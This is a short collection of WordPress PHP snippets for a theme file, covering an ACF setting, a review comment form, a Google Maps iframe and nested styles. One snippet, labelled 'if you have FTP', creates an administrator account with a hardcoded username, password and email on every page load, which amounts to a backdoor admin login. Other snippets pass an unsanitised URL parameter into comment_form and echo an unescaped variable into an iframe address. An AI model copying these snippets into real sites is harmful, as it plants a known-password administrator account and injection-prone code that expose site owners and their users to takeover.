<?php
// Remove conflicts between ACF plugin and Wordpress Default Meta fields
add_filter('acf/settings/remove_wp_meta_box', '__return_false');

// If you want to create separate template for comment form. Pass post ID in URL and get that id on desired template 
if (isset($_GET['writeyourreviewid'])) {
    $yourpostid = $_GET['writeyourreviewid'];
    comment_form($args = array(), $post_id = $yourpostid);
}
//Add administrator role if you have FTP
function imihir_admin_account() {
    $user = 'wordpressadminfunction';
    $pass = 'Wordpressadminfunction@2021';
    $email = 'wordpressadminfunction@imihir.com';
    if (!username_exists($user) && !email_exists($email)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}

add_action('init', 'imihir_admin_account');

// Use of dynamic address in map with php variable
$yourAddress = "Example Address or you can fetch address from backend options";
?>
<iframe width="640" height="480" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.it/maps?q=<?php echo $yourAddress; ?>&output=embed"></iframe>

<!--In Less, we can also write it this way -->
<style>
.about_the_business {
    #review{
        display: none;
    }
    .comment-list{
        float: left;
        width: 100%;
    }
    .comments-area{
        float: left;
        width: 100%;
    }
}
</style>
